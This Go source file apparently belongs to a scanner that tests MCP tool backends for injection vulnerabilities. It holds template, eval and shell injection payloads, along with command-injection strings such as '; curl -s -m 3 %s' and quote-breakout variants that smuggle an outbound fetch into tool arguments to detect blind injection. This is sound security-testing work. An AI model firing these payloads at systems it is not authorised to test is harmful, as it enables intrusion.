// Package mcptool provides tool-backend security probes for MCP targets.
// Its probes (Injection, SSRF, PathTraversal) invoke REAL tools through
// types.ToolInvoker to test the backend's own behaviour — injection
// sinks, authorization, SSRF, path traversal. This is distinct from the
// model-facing tool probes elsewhere in the tree that only ask whether
// an LLM can be manipulated INTO a tool call: mcptool calls the tools
// itself and observes what actually runs.
//
// Sibling package: internal/probes/mcptransport houses transport-layer
// probes (OriginValidation, SSESessionHijack) that bypass the MCP
// protocol entirely and issue raw HTTP. Different attack surface,
// different interface (types.MCPEndpoint), different package.
package mcptool

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"math/big"
	"strconv"
)

// randToken returns a random 16-hex-char token for canaries/OOB paths.
func randToken() string {
	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		return "augfallback000000"
	}
	return hex.EncodeToString(b)
}

// canary is a computed-arithmetic injection canary. Each payload, if the target
// evaluates it, yields `marker` (the product) in the output. The marker never
// appears literally in any payload, so a tool that merely echoes its input back
// cannot produce a false positive — the failure mode that made the old
// echo-based detectors useless against direct tool calls.
type canary struct {
	marker   string
	payloads []string
}

// payloadFormats render the same multiplication across the injection classes we
// cover: bare expression/eval, template engines (SSTI), and shell.
var payloadFormats = []string{
	"%d*%d",             // bare expression / eval / Python
	"{{%d*%d}}",         // Jinja / Twig / Nunjucks SSTI
	"${%d*%d}",          // JSP EL / Freemarker / shell-ish templates
	"#{%d*%d}",          // Ruby / Thymeleaf EL
	"$((%d*%d))",        // shell arithmetic expansion
	"; expr %d \\* %d",  // command injection via separator
	"$(expr %d \\* %d)", // command substitution
	"`expr %d \\* %d`",  // backtick command substitution
}

// oobCmdFormats are OS-command-injection payload templates. Each embeds a single
// canary URL (the %s): a tool that passes the argument to a shell (directly or
// via os/system, subprocess with shell=True, backtick eval, etc.) will fetch the
// URL, producing an out-of-band callback on the collector. This catches BLIND
// command injection — the sink runs but returns nothing to the client — which the
// computed-arithmetic payloadFormats above cannot, since they rely on the result
// being reflected in-band. The separators cover POSIX shells (`;`, `|`, `&&`,
// newline, `$(...)`, backticks) and Windows cmd (`&`); curl and wget both ship on
// modern Linux/macOS and curl ships on Windows 10+. Every fetch carries a short
// timeout (`-m`/`-T`) so a target whose OS silently blackholes the connection to
// an unroutable collector can't hang the (sequential) probe for minutes.
var oobCmdFormats = []string{
	"; curl -s -m 3 %s",        // statement separator
	"| curl -s -m 3 %s",        // pipe
	"& curl -s -m 3 %s",        // background / Windows cmd separator
	"&& curl -s -m 3 %s",       // conditional chain
	"$(curl -s -m 3 %s)",       // command substitution
	"`curl -s -m 3 %s`",        // backtick command substitution
	"; wget -qO- -T 3 %s",      // wget fallback where curl is absent
	"\ncurl -s -m 3 %s",        // newline injection (also covers direct-exec sinks)
	"' ; curl -s -m 3 %s ; #",  // break out of single-quoted context; # eats the wrapper's trailing quote
	"\" ; curl -s -m 3 %s ; #", // break out of double-quoted context; # eats the wrapper's trailing quote
}

// newCanary builds a canary from two random factors. The product is ~9 digits,
// making a coincidental appearance in benign output vanishingly unlikely.
func newCanary() canary {
	a := randInt(100000, 999999)
	b := randInt(101, 999)
	c := canary{marker: strconv.Itoa(a * b)}
	c.payloads = make([]string, len(payloadFormats))
	for i, f := range payloadFormats {
		c.payloads[i] = fmt.Sprintf(f, a, b)
	}
	return c
}

// randInt returns a random int in [min, max). On the (practically impossible)
// RNG failure it falls back to min, which still yields a valid canary.
func randInt(min, max int) int {
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min)))
	if err != nil {
		return min
	}
	return min + int(n.Int64())
}

// paramInfo describes one tool parameter parsed from its JSON-schema.
type paramInfo struct {
	name     string
	typ      string
	required bool
}

// toolParams parses the parameters of a tool in the canonical Conversation.Tools
// wire shape (map with a "parameters" JSON-schema object).
func toolParams(tool map[string]any) []paramInfo {
	schema, ok := tool["parameters"].(map[string]any)
	if !ok {
		return nil
	}
	props, _ := schema["properties"].(map[string]any)

	required := map[string]bool{}
	switch req := schema["required"].(type) {
	case []any:
		for _, r := range req {
			if s, ok := r.(string); ok {
				required[s] = true
			}
		}
	case []string:
		for _, s := range req {
			required[s] = true
		}
	}

	out := make([]paramInfo, 0, len(props))
	for name, raw := range props {
		typ := ""
		if p, ok := raw.(map[string]any); ok {
			typ, _ = p["type"].(string)
		}
		out = append(out, paramInfo{name: name, typ: typ, required: required[name]})
	}
	return out
}

// isStringParam reports whether a param is a viable injection target. An absent
// type is treated as string-injectable (schemas in the wild often omit it).
func isStringParam(typ string) bool {
	return typ == "" || typ == "string"
}

// benignArgs builds a call argument map: the injected payload in injectParam, and
// benign placeholders for every other required param so the call reaches the sink
// instead of failing argument validation.
func benignArgs(params []paramInfo, injectParam, payload string) map[string]any {
	args := map[string]any{injectParam: payload}
	for _, p := range params {
		if p.name == injectParam || !p.required {
			continue
		}
		args[p.name] = benignValue(p.typ)
	}
	return args
}

func benignValue(typ string) any {
	switch typ {
	case "integer", "number":
		return 1
	case "boolean":
		return true
	case "array":
		return []any{}
	case "object":
		return map[string]any{}
	default:
		return "test"
	}
}
